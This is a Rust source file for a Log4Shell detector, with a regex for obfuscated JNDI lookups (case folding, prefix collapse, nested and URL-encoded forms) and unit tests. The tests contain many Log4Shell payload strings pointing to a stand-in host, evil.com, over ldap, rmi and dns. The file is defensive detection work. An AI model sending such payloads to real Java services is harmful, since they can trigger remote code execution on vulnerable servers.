// Copyright (c) 2026 erik <erik@erik.xyz> — https://erik.xyz

use crate::{AttackCategory, DetectionResult, Detector, Severity, regex_detect};
use regex::Regex;
use std::sync::LazyLock;

// log4j 的 lookup 前缀。花括号里的内容必须落在名录内——光看"`${` 里套 `${`"或
// "`}` 后面跟着 ndi"会把 shell 的 `${VAR:-${DEFAULT}}`、`${VAR:?${MSG}}`、
// `${PATH:+${PATH}:/opt}` 和 `${x}${y}` 全打成 Critical。这些形状在 shell/Makefile
// 里是日常写法，唯一能把它们和 log4j 混淆区分开的就是关键字。
const LOOKUP: &str =
    r"(?:jndi|lower|upper|env|sys|date|java|main|ctx|base64|hostName|map|marker|spring)";

// 与 JndiInjectionDetector 的分工：那边认字面量 `${jndi:`、`${lower:j}`，
// 这边专攻"lookup 展开后才拼出 jndi"的混淆变体——攻击串里根本不含 `jndi` 五个字母。
// 六条模式合成一条 alternation：干净输入上每条模式都要走到串尾，条数直接乘在单次
// `find` 的开销上；合并后一次扫描扫完六条分支。各分支的完整文本未变，只多了 `|`。
// `(?i)` 为六条分支所共有，提到最前——它的作用域是整条模式（含 `|` 之后的全部分支），
// 与逐条编译时每条各自带 `(?i)` 等价。
static PATTERNS: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        &[
            // ${lower:j} / ${upper:J}：单字符大小写折叠，正常模板不会这么写
            r"(?i)\$\{(?:lower|upper)\s*:\s*[a-z]\s*\}",
            // ${::-j}：前缀折叠
            r"|\$\{\s*::-?[a-z]{1,3}\s*\}",
            // ${<lookup>}ndi: —— lookup 展开结果紧邻 ndi（`${lower:j}ndi:` 里 `}` 直接接 ndi，
            // 所以判据只能放在花括号内是不是 lookup，不能放在 `}` 后面跟什么）
            r"|\$\{\s*",
            LOOKUP,
            r"\s*:[^{}]{0,120}\}\s*[a-z]{0,4}ndi\s*[:/{]",
            // ${${<lookup>...}}：嵌套展开，内层同样必须是 lookup 关键字
            r"|\$\{\s*[^{}]{0,120}\$\{\s*",
            LOOKUP,
            r"\s*:",
            // URL 编码形态 %24%7Blower%3Aj%7Dndi，绕 WAF 用
            r"|%24%7b\s*",
            LOOKUP,
            r"\s*(?::|%3a).{0,120}%7d.{0,4}ndi",
            // 整体 URL 编码的 `${jndi:`：`%24%7Bjndi%3A...%7D`。这里 `jndi` 是字面量、
            // 且载荷以 `%7d` 收尾（`%7d` 后面没有 ndi 尾巴），上一条的「lookup 展开后
            // 才拼出 jndi」判据套不上。注意本分支**不**放宽 `.{0,4}ndi` 为可选：一旦
            // 可选，`%24%7Bdate%3Ayyyy-MM-dd%7D`（编码后的 `${date:...}`）也会命中 ——
            // 而字面量 `${date:...}` 在测试里是干净的，编码后不该变脸。
            r"|%24%7b\s*jndi\s*(?::|%3a)",
        ]
        .concat(),
    )
    .unwrap()
});

pub struct Log4ShellDetector;

impl Detector for Log4ShellDetector {
    fn name(&self) -> &'static str {
        "log4shell"
    }

    fn detect(&self, input: &str) -> Option<DetectionResult> {
        regex_detect(
            std::slice::from_ref(&*PATTERNS),
            self.name(),
            AttackCategory::Protocol,
            Severity::Critical,
            "Log4Shell lookup obfuscation detected",
            input,
        )
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::test_helpers::{assert_clean, assert_detected};

    fn det() -> Log4ShellDetector {
        Log4ShellDetector
    }

    fn assert_hit(input: &str) {
        assert_detected(&det(), input, AttackCategory::Protocol, Severity::Critical);
    }

    #[test]
    fn name_is_log4shell() {
        assert_eq!(det().name(), "log4shell");
    }

    #[test]
    fn detects_case_folding_lookup() {
        for input in [
            "${lower:j}ndi:ldap://evil.com/a}",
            "${upper:j}NDI:rmi://evil.com/a}",
            "${lower:j}",
            "${upper:J}",
        ] {
            assert_hit(input);
        }
    }

    #[test]
    fn detects_prefix_collapse_lookup() {
        for input in [
            "${::-j}ndi:ldap://evil.com/a}",
            "${::-j}",
            "${::-J}ndi:dns://evil.com}",
        ] {
            assert_hit(input);
        }
    }

    #[test]
    fn detects_lookup_then_ndi_tail() {
        for input in [
            "${env:BARFOO:-j}ndi:ldap://evil.com/a}",
            "${sys:user.name}ndi:ldap://evil.com/a}",
            "${date:'j'}ndi:ldap://evil.com/a}",
            "${java:version}ndi://evil.com/x}",
        ] {
            assert_hit(input);
        }
    }

    #[test]
    fn detects_nested_lookup() {
        for input in [
            "${${lower:j}ndi:ldap://evil.com/a}",
            "${${env:FOO:-ldap}://evil.com/a}",
            "${${sys:x}${lower:j}}",
        ] {
            assert_hit(input);
        }
    }

    #[test]
    fn detects_url_encoded_payload() {
        for input in [
            "%24%7Blower%3Aj%7Dndi:ldap://evil.com/a",
            "%24%7B%24%7Blower%3Aj%7Dndi%3Aldap%3A%2F%2Fevil.com%7D",
        ] {
            assert_hit(input);
        }
    }

    #[test]
    fn detects_fully_url_encoded_jndi() {
        for input in [
            "%24%7Bjndi%3Aldap%3A%2F%2Fevil.com%7D",
            "%24%7Bjndi:ldap://evil.com/a%7D",
            "%24%7bJNDI%3Armi%3A%2F%2Fevil.com%2Fx%7D",
        ] {
            assert_hit(input);
        }
    }

    /// 反向对照：光有 `%7B` / `%24%7B` 不是信号，得是 `jndi` 这个 lookup
    #[test]
    fn ignores_encoded_non_jndi_lookups() {
        for input in [
            "%24%7Buser%7D",
            "%7Bjndi%7D 只是编码过的花括号",
            "%24%7Bdate%3Ayyyy-MM-dd%7D 是编码后的日期占位符",
            "https://example.com/?filter=%24%7Bname%7D",
        ] {
            assert_clean(&det(), input);
        }
    }

    #[test]
    fn ignores_benign_inputs() {
        for input in [
            "Hello, this is a normal text input. Nothing suspicious here.",
            "the price is ${amount}",
            "The total is ${total} dollars, tax is ${tax}.",
            "cost: $10",
            "const x = `${name}`; // 模板字符串",
            "printf(\"%s\", ${var});",
            "${date:yyyy-MM-dd} 是 log4j 的日期占位符",
            "${env:JAVA_HOME} 读取环境变量",
            "url: http://example.com/?q=%24%7Bfoo%7D",
        ] {
            assert_clean(&det(), input);
        }
    }

    #[test]
    fn ignores_shell_default_and_alternate_expansions() {
        // ${VAR:-${DEFAULT}} / ${VAR:?${MSG}} / ${VAR:+${X}:/opt} 是 shell 的日常写法，
        // 与 log4j 的嵌套 lookup 同形——只有花括号里是不是 lookup 关键字能区分。
        for input in [
            "echo ${A:-${B}}",
            "echo ${VAR:?${OTHER}}",
            "make: ${CC:-${CROSS_COMPILE}gcc}",
            "echo \"${PATH:+${PATH}:/opt}\"",
        ] {
            assert_clean(&det(), input);
        }
    }

    #[test]
    fn ignores_short_suffix_before_ndi() {
        // `ndi` 前只剩短尾巴（`${x}ndi/`）不是 log4j：`${lower:j}ndi:` 里的 `}` 直接接
        // ndi，所以不能靠"`}` 后必须有 j"来判定，只能要求花括号内是 lookup。
        for input in ["${x}ndi/x", "${x}indi:", "${x}hindi:", "${name}andi: 你好"] {
            assert_clean(&det(), input);
        }
    }

    #[test]
    fn edge_cases() {
        assert_clean(&det(), "");
        assert_clean(&det(), "   ");
        assert_clean(&det(), "你好世界 こんにちは");
        // 缺 ${ 或 } 的近失串
        assert_clean(&det(), "lower:j}ndi:ldap://evil.com");
        assert_clean(&det(), "${lower:jndi:ldap://evil.com}");
        assert_clean(&det(), "${ndi:ldap://evil.com}");
    }
}
